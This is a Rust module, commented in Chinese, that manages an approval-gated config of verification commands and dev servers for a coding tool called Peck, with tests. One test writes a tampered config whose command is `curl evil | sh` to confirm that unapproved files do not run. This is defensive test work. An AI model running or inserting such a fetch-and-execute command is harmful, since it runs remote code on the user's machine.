//! 验证命令（v0.6 Phase 8）：`.peck/verify.toml`。模型改了文件，Peck 在后台替它跑；模型停下时收尾前再看一遍，
//! 没过就把失败交回去修（`monitor.rs`）。
//!
//! ```toml
//! [[check]]
//! name = "check"
//! run = "cargo check --all-targets"
//! when = ["**/*.rs", "**/Cargo.toml"]   # 改了这些才跑；空着是改了什么都跑
//! timeout = 300                         # 秒，默认 300
//!
//! [[server]]
//! name = "dev"
//! run = "pnpm dev"
//! ready = "Local:"                      # 输出里出现这段算起好了（可不填）
//! autostart = false                     # 发任务时没在跑就先起
//! ```
//!
//! 第一次打开项目、还没有这份文件时，Peck 按项目里的 `package.json`、`Cargo.toml`、`go.mod`、`pyproject.toml`、
//! `Makefile` 猜几条，站主在中栏确认（可以改）才写进去；不要就记在项目设置里（`verifyDismissed`），不再问。
//! `.peck/` 在打开项目时已经加进了 `.gitignore`。

use crate::state::AppState;
use globset::{Glob, GlobSet, GlobSetBuilder};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

pub const VERIFY_FILE: &str = ".peck/verify.toml";
pub const DEFAULT_TIMEOUT: u64 = 300;
pub const MAX_TIMEOUT: u64 = 3600;
const MAX_CHECKS: usize = 8;
const MAX_SERVERS: usize = 4;

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct VerifyConfig {
    #[serde(default)]
    pub check: Vec<Check>,
    #[serde(default)]
    pub server: Vec<Server>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Check {
    pub name: String,
    pub run: String,
    /// 改了哪些文件才跑（glob，相对项目根）。空：改了什么都跑。
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub when: Vec<String>,
    /// 秒。
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub timeout: Option<u64>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Server {
    pub name: String,
    pub run: String,
    /// 输出里出现这段文字算起好了。
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ready: Option<String>,
    /// 发任务时没在跑就先起。
    #[serde(default)]
    pub autostart: bool,
}

impl Check {
    pub fn timeout_secs(&self) -> u64 {
        self.timeout.unwrap_or(DEFAULT_TIMEOUT).clamp(1, MAX_TIMEOUT)
    }

    fn globs(&self) -> Option<GlobSet> {
        if self.when.is_empty() {
            return None;
        }
        let mut b = GlobSetBuilder::new();
        for w in &self.when {
            if let Ok(g) = Glob::new(w.trim()) {
                b.add(g);
            }
        }
        b.build().ok()
    }

    /// 改了的这些文件里有没有它管的。
    pub fn matches(&self, changed: &[String]) -> bool {
        if changed.is_empty() {
            return false;
        }
        match self.globs() {
            None => true,
            Some(set) => changed.iter().any(|p| set.is_match(p)),
        }
    }
}

impl VerifyConfig {
    pub fn is_empty(&self) -> bool {
        self.check.is_empty() && self.server.is_empty()
    }

    pub fn parse(text: &str) -> Result<Self, String> {
        let config: Self = toml::from_str(text).map_err(|e| format!("verify.toml 写得不对：{}", e.message()))?;
        config.validate()?;
        Ok(config)
    }

    pub fn validate(&self) -> Result<(), String> {
        if self.check.len() > MAX_CHECKS {
            return Err(format!("验证命令最多 {MAX_CHECKS} 条。"));
        }
        if self.server.len() > MAX_SERVERS {
            return Err(format!("常驻的 dev server 最多 {MAX_SERVERS} 个。"));
        }
        let mut names = std::collections::HashSet::new();
        for (name, run) in self.check.iter().map(|c| (&c.name, &c.run)).chain(self.server.iter().map(|s| (&s.name, &s.run))) {
            let n = name.trim();
            if n.is_empty() || n.len() > 40 {
                return Err("每一条都要有名字（40 个字符以内）。".into());
            }
            if !names.insert(n.to_string()) {
                return Err(format!("名字「{n}」重复了。"));
            }
            if run.trim().is_empty() {
                return Err(format!("「{n}」没写 run（要跑的命令）。"));
            }
        }
        for c in &self.check {
            if c.timeout.is_some_and(|t| t == 0 || t > MAX_TIMEOUT) {
                return Err(format!("「{}」的 timeout 要在 1 到 {MAX_TIMEOUT} 秒之间。", c.name));
            }
            for w in &c.when {
                Glob::new(w.trim()).map_err(|e| format!("「{}」的 when 里「{w}」不是有效的通配：{e}", c.name))?;
            }
        }
        Ok(())
    }

    /// 写成 TOML（猜出来给站主看的、存的都是这份），带一段说明。
    pub fn to_toml(&self) -> String {
        let mut out = String::from(
            "# Peck 的验证命令：模型改了文件，Peck 在后台替它跑；模型停下时没过就把失败交回去修（最多 3 次）。\n\
             # [[check]]：name、run（命令）、when（改了哪些文件才跑，不写是都跑）、timeout（秒，默认 300）\n\
             # [[server]]：常驻的 dev server，name、run、ready（输出里出现这段算起好了）、autostart\n",
        );
        for c in &self.check {
            out.push_str(&format!("\n[[check]]\nname = {}\nrun = {}\n", q(&c.name), q(&c.run)));
            if !c.when.is_empty() {
                out.push_str(&format!("when = [{}]\n", c.when.iter().map(|w| q(w)).collect::<Vec<_>>().join(", ")));
            }
            if let Some(t) = c.timeout {
                out.push_str(&format!("timeout = {t}\n"));
            }
        }
        for s in &self.server {
            out.push_str(&format!("\n[[server]]\nname = {}\nrun = {}\n", q(&s.name), q(&s.run)));
            if let Some(r) = &s.ready {
                out.push_str(&format!("ready = {}\n", q(r)));
            }
            out.push_str(&format!("autostart = {}\n", s.autostart));
        }
        out
    }

    pub fn find_check(&self, name: &str) -> Option<&Check> {
        self.check.iter().find(|c| c.name == name)
    }
}

fn q(s: &str) -> String {
    toml::Value::String(s.to_string()).to_string()
}

/// 站主确认的是哪一份：原文的 md5。
pub fn approval_of(text: &str) -> String {
    crate::workspace::md5_hex(text.as_bytes())
}

/// 读 `.peck/verify.toml`（跑任务、起 dev server 用）：只认站主确认过的那一份（项目里自带的、模型或别人改过的，确认前不跑）。
pub fn load_approved(root: &Path, approved: Option<&str>) -> Result<Option<VerifyConfig>, String> {
    let text = match std::fs::read_to_string(root.join(VERIFY_FILE)) {
        Ok(text) => text,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(format!("读不了 verify.toml：{e}")),
    };
    if approved != Some(approval_of(&text).as_str()) {
        return Err(UNAPPROVED.into());
    }
    VerifyConfig::parse(&text).map(Some)
}

pub const UNAPPROVED: &str = ".peck/verify.toml 还没确认（项目里自带的，或者改过了）：在 NEW TASK 上或项目设置里确认以后，Peck 才替模型跑、才起 dev server。";

const JS_EXT: &str = "**/*.{ts,tsx,js,jsx,mjs,cjs,vue,svelte,css}";

/// 按项目里有的东西猜几条（不跑任何命令）。猜不出为空。
pub fn guess(root: &Path) -> VerifyConfig {
    let mut config = VerifyConfig::default();
    // Node：package.json 的 scripts
    if let Some(pkg) = std::fs::read_to_string(root.join("package.json")).ok().and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok()) {
        let pm = if root.join("pnpm-lock.yaml").exists() {
            "pnpm"
        } else if root.join("yarn.lock").exists() {
            "yarn"
        } else if root.join("bun.lockb").exists() || root.join("bun.lock").exists() {
            "bun"
        } else {
            "npm run"
        };
        let run = |s: &str| if pm == "npm run" { format!("npm run {s}") } else { format!("{pm} {s}") };
        let scripts = pkg.get("scripts").and_then(|s| s.as_object()).cloned().unwrap_or_default();
        let has = |s: &str| scripts.get(s).and_then(|v| v.as_str()).is_some_and(|v| !v.contains("no test specified"));
        for name in ["typecheck", "check"] {
            if has(name) {
                config.check.push(Check { name: name.into(), run: run(name), when: vec![JS_EXT.into()], timeout: None });
                break;
            }
        }
        if has("lint") {
            config.check.push(Check { name: "lint".into(), run: run("lint"), when: vec![JS_EXT.into()], timeout: None });
        }
        if has("test") {
            let test = if pm == "npm run" { "npm test".to_string() } else { run("test") };
            config.check.push(Check { name: "test".into(), run: test, when: vec![JS_EXT.into()], timeout: None });
        }
        if has("dev") {
            config.server.push(Server { name: "dev".into(), run: run("dev"), ready: None, autostart: false });
        }
    }
    // Rust：根目录或下一层的 Cargo.toml
    let cargo = if root.join("Cargo.toml").is_file() {
        Some(String::new())
    } else {
        std::fs::read_dir(root).ok().and_then(|entries| {
            let mut dirs: Vec<PathBuf> = entries.flatten().map(|e| e.path()).filter(|p| p.join("Cargo.toml").is_file()).collect();
            dirs.sort();
            dirs.first().and_then(|d| d.file_name()).map(|n| format!(" --manifest-path {}/Cargo.toml", n.to_string_lossy()))
        })
    };
    if let Some(manifest) = cargo {
        let rs = vec!["**/*.rs".to_string(), "**/Cargo.toml".to_string()];
        let taken: Vec<String> = config.check.iter().map(|c| c.name.clone()).collect();
        let name = |n: &str| if taken.iter().any(|c| c == n) { format!("cargo-{n}") } else { n.to_string() };
        let (check, test) = (name("check"), name("test"));
        config.check.push(Check { name: check, run: format!("cargo check --all-targets{manifest}"), when: rs.clone(), timeout: None });
        config.check.push(Check { name: test, run: format!("cargo test{manifest}"), when: rs, timeout: Some(600) });
    }
    // Go
    if root.join("go.mod").is_file() {
        let go = vec!["**/*.go".to_string(), "go.mod".to_string()];
        config.check.push(Check { name: "build".into(), run: "go build ./...".into(), when: go.clone(), timeout: None });
        config.check.push(Check { name: "go-test".into(), run: "go test ./...".into(), when: go, timeout: Some(600) });
    }
    // Python
    let pyproject = std::fs::read_to_string(root.join("pyproject.toml")).unwrap_or_default();
    if !pyproject.is_empty() || root.join("setup.py").is_file() {
        let py = vec!["**/*.py".to_string()];
        if pyproject.contains("[tool.ruff") || root.join("ruff.toml").is_file() {
            config.check.push(Check { name: "ruff".into(), run: "ruff check .".into(), when: py.clone(), timeout: None });
        }
        if pyproject.contains("pytest") || root.join("tests").is_dir() || root.join("pytest.ini").is_file() {
            config.check.push(Check { name: "pytest".into(), run: "python3 -m pytest -q".into(), when: py, timeout: Some(600) });
        }
    }
    // Makefile 里有 test
    if config.check.is_empty() {
        if let Ok(make) = std::fs::read_to_string(root.join("Makefile")) {
            if make.lines().any(|l| l.starts_with("test:")) {
                config.check.push(Check { name: "test".into(), run: "make test".into(), when: vec![], timeout: Some(600) });
            }
        }
    }
    config.check.truncate(MAX_CHECKS);
    config
}

// ───────────────────────── IPC ─────────────────────────

/// 中栏和项目设置读的：现在有没有 verify.toml、内容、写错了没有、猜的、站主说过不要没有。
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct VerifyState {
    pub exists: bool,
    /// 文件原文（有的话）。
    pub text: Option<String>,
    pub config: Option<VerifyConfig>,
    /// 写错了：原因。
    pub error: Option<String>,
    /// 没有文件时猜的（TOML 原文）；猜不出为空。
    pub guessed: Option<String>,
    /// 站主在中栏点过「不要」。
    pub dismissed: bool,
    /// 文件和站主确认过的那一份一样（没有文件时为 false）。
    pub approved: bool,
}

fn workspace_root(state: &AppState, workspace_id: &str) -> Result<(crate::workspace::Workspace, PathBuf), String> {
    let db = state.store.lock().map_err(|_| "读不到项目。")?;
    let ws = db.workspace(workspace_id).map_err(|_| "没找到这个项目。")?;
    let root = PathBuf::from(&ws.path);
    if !root.is_dir() {
        return Err("项目文件夹不在了。".into());
    }
    Ok((ws, root))
}

pub fn state_of(root: &Path, dismissed: bool, approved: Option<&str>) -> VerifyState {
    let text = std::fs::read_to_string(root.join(VERIFY_FILE)).ok();
    let (config, error) = match &text {
        Some(t) => match VerifyConfig::parse(t) {
            Ok(c) => (Some(c), None),
            Err(e) => (None, Some(e)),
        },
        None => (None, None),
    };
    let guessed = if text.is_none() {
        let g = guess(root);
        (!g.is_empty()).then(|| g.to_toml())
    } else {
        None
    };
    let approved = text.as_deref().is_some_and(|t| approved == Some(approval_of(t).as_str()));
    VerifyState { exists: text.is_some(), text, config, error, guessed, dismissed, approved }
}

#[tauri::command]
pub fn verify_get(workspace_id: String, state: tauri::State<'_, AppState>) -> Result<VerifyState, String> {
    let (ws, root) = workspace_root(&state, &workspace_id)?;
    Ok(state_of(&root, ws.settings.verify_dismissed, ws.settings.verify_approved.as_deref()))
}

/// 站主确认（或在项目设置里改了）：校验后写进 `.peck/verify.toml`。
#[tauri::command]
pub fn verify_save(workspace_id: String, text: String, state: tauri::State<'_, AppState>) -> Result<VerifyState, String> {
    let (_, root) = workspace_root(&state, &workspace_id)?;
    save(&root, &text)?;
    // 写进去的就是站主确认的这一份。
    let db = state.store.lock().map_err(|_| "读不到项目。")?;
    let mut ws = db.workspace(&workspace_id).map_err(|_| "没找到这个项目。")?;
    ws.settings.verify_approved = Some(approval_of(&text));
    db.save_workspace(&ws).map_err(|e| e.to_string())?;
    Ok(state_of(&root, ws.settings.verify_dismissed, ws.settings.verify_approved.as_deref()))
}

pub fn save(root: &Path, text: &str) -> Result<VerifyConfig, String> {
    let config = VerifyConfig::parse(text)?;
    let path = root.join(VERIFY_FILE);
    std::fs::create_dir_all(path.parent().unwrap_or(root)).map_err(|e| format!("建不了 .peck：{e}"))?;
    let tmp = path.with_extension("toml.tmp");
    std::fs::write(&tmp, text).map_err(|e| format!("写不进 verify.toml：{e}"))?;
    std::fs::rename(&tmp, &path).map_err(|e| format!("写不进 verify.toml：{e}"))?;
    Ok(config)
}

/// 站主不要猜的那几条：记在项目设置里，中栏不再问（项目设置里照样能写）。
#[tauri::command]
pub fn verify_dismiss(workspace_id: String, state: tauri::State<'_, AppState>) -> Result<VerifyState, String> {
    let (root, approved) = {
        let db = state.store.lock().map_err(|_| "读不到项目。")?;
        let mut ws = db.workspace(&workspace_id).map_err(|_| "没找到这个项目。")?;
        ws.settings.verify_dismissed = true;
        db.save_workspace(&ws).map_err(|e| e.to_string())?;
        (PathBuf::from(ws.path), ws.settings.verify_approved)
    };
    Ok(state_of(&root, true, approved.as_deref()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::harness::tools::testing::TempProject;

    #[test]
    fn parses_validates_and_round_trips() {
        let text = "[[check]]\nname = \"check\"\nrun = \"cargo check\"\nwhen = [\"**/*.rs\"]\n\n[[server]]\nname = \"dev\"\nrun = \"pnpm dev\"\nautostart = true\n";
        let c = VerifyConfig::parse(text).unwrap();
        assert_eq!(c.check[0].timeout_secs(), DEFAULT_TIMEOUT);
        assert!(c.server[0].autostart);
        assert_eq!(VerifyConfig::parse(&c.to_toml()).unwrap(), c);
        assert!(VerifyConfig::parse("[[check]]\nname = \"a\"\nrun = \"\"\n").unwrap_err().contains("run"));
        assert!(VerifyConfig::parse("[[check]]\nname = \"a\"\nrun = \"x\"\n[[check]]\nname = \"a\"\nrun = \"y\"\n").unwrap_err().contains("重复"));
        assert!(VerifyConfig::parse("[[check]]\nname = \"a\"\nrun = \"x\"\nwhen = [\"[\"]\n").unwrap_err().contains("通配"));
        assert!(VerifyConfig::parse("check = 3").is_err());
        assert!(VerifyConfig::parse("").unwrap().is_empty());
    }

    #[test]
    fn checks_match_changed_files() {
        let c = Check { name: "c".into(), run: "x".into(), when: vec!["**/*.rs".into(), "Cargo.toml".into()], timeout: None };
        assert!(c.matches(&["src/a/b.rs".into()]));
        assert!(c.matches(&["main.rs".into()]));
        assert!(c.matches(&["Cargo.toml".into()]));
        assert!(!c.matches(&["README.md".into()]));
        assert!(!c.matches(&[]));
        let any = Check { when: vec![], ..c };
        assert!(any.matches(&["README.md".into()]));
    }

    #[test]
    fn guesses_from_what_the_project_has() {
        let p = TempProject::new();
        assert!(guess(&p.dir).is_empty());
        p.write("package.json", r#"{"scripts":{"check":"tsc --noEmit","test":"vitest run","dev":"vite"}}"#).write("pnpm-lock.yaml", "");
        p.write("src-tauri/Cargo.toml", "[package]\nname='x'\n");
        let g = guess(&p.dir);
        let runs: Vec<&str> = g.check.iter().map(|c| c.run.as_str()).collect();
        assert_eq!(runs, ["pnpm check", "pnpm test", "cargo check --all-targets --manifest-path src-tauri/Cargo.toml", "cargo test --manifest-path src-tauri/Cargo.toml"]);
        assert_eq!(g.check[2].name, "cargo-check");
        assert_eq!(g.server[0].run, "pnpm dev");
        assert!(VerifyConfig::parse(&g.to_toml()).is_ok());

        let p = TempProject::new();
        p.write("package.json", r#"{"scripts":{"test":"echo \"Error: no test specified\" && exit 1"}}"#);
        assert!(guess(&p.dir).check.is_empty(), "npm 默认的 test 不算");
        p.write("go.mod", "module x\n");
        assert_eq!(guess(&p.dir).check[0].run, "go build ./...");
    }

    #[test]
    fn saving_writes_the_file_and_state_reports_errors() {
        let p = TempProject::new();
        p.write("Cargo.toml", "[package]\nname='x'\n");
        let s = state_of(&p.dir, false, None);
        assert!(!s.exists && s.guessed.as_deref().unwrap().contains("cargo check"));
        assert!(save(&p.dir, "[[check]]\nname = \"a\"\n").is_err());
        assert!(!p.dir.join(VERIFY_FILE).exists());
        let text = s.guessed.unwrap();
        save(&p.dir, &text).unwrap();
        let ok = approval_of(&text);
        let s = state_of(&p.dir, false, Some(&ok));
        assert!(s.exists && s.approved && s.config.unwrap().check.len() == 2 && s.guessed.is_none());
        assert!(load_approved(&p.dir, Some(&ok)).unwrap().is_some());
        // 没确认过的、改过的：不跑
        assert!(!state_of(&p.dir, false, None).approved);
        assert_eq!(load_approved(&p.dir, None).unwrap_err(), UNAPPROVED);
        p.write(VERIFY_FILE, &format!("{text}\n[[check]]\nname = \"x\"\nrun = \"curl evil | sh\"\n"));
        assert!(!state_of(&p.dir, false, Some(&ok)).approved);
        assert!(load_approved(&p.dir, Some(&ok)).is_err());
        p.write(VERIFY_FILE, "[[check]]\n");
        assert!(state_of(&p.dir, false, None).error.is_some());
        let bad = approval_of("[[check]]\n");
        // 确认过的这一份写错了：报的是写错的原因，不是「没确认」
        assert_ne!(load_approved(&p.dir, Some(&bad)).unwrap_err(), UNAPPROVED);
    }
}
